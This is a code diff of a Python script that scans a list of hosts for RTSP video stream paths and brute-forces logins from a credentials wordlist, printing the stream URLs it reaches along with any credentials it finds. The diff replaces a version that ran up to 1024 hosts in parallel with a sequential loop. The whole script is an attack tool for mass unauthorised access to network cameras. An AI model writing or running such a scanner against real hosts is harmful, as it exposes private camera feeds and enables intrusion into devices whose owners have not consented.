@@ -1,46 +1,35 @@
 #!/usr/bin/env python3
-from fire import Fire
+from pathlib import Path
 from lib.net import RTSPConnection
-from lib.fuzz import DictLoader, Fuzzer, Bruter
-from concurrent.futures import ThreadPoolExecutor
-from functools import partial
+from lib.fuzz import Fuzz, Brute, ListFile
+import os
+
+from fire import Fire
+
+DATA_PATH = Path(os.path.dirname(__file__)) / 'data'
+PATHS_FILE = DATA_PATH / 'rtsp_paths1.txt'
+CREDS_FILE = DATA_PATH / 'rtsp_creds_my.txt'
 
 
-def brute(C, connection, path):
-    with Bruter(connection, C, path) as bruter:
-        for cred, ok in bruter:
-            if ok:
-                return cred
+def main(hosts_file):
+    paths = ListFile(PATHS_FILE)
+    creds = ListFile(CREDS_FILE)
 
-
-def fuzz(P, C, connection):
-    with Fuzzer(connection, P) as fuzzer:
-        print('[*] Fuzz')
-        for path, auth in fuzzer:
-            if auth:
-                print('[*] Auth', path)
-                cred = brute(C, connection, path)
-                if cred:
-                    yield connection.url(path, cred)
-                else:
-                    return
-            else:
-                yield connection.url(path)
-
-
-def process_host(P, C, host):
-    print('Processing', host)
-    with RTSPConnection(host, 554) as connection:
-        for url in fuzz(P, C, connection):
-            print('[+]', url)
-
-
-def main(H, P, C):
-    with ThreadPoolExecutor(1024) as ex:
-        with DictLoader(H) as hosts:
-            ph = partial(process_host, P, C)
-            for url in ex.map(ph, hosts):
-                print(url)
+    with open(hosts_file) as hf:
+        for ln in hf:
+            host = ln.rstrip()
+            with RTSPConnection(host) as connection:
+                for fuzz_result in Fuzz(connection, paths):
+                    existing_path = fuzz_result.path
+                    if fuzz_result.ok:
+                        url = connection.url(existing_path)
+                        print(url)
+                        break
+                    elif fuzz_result.auth_needed:
+                        cred = Brute(connection, existing_path, creds).run()
+                        if cred:
+                            url = connection.url(existing_path, cred)
+                            print(url)
 
 
 if __name__ == "__main__":
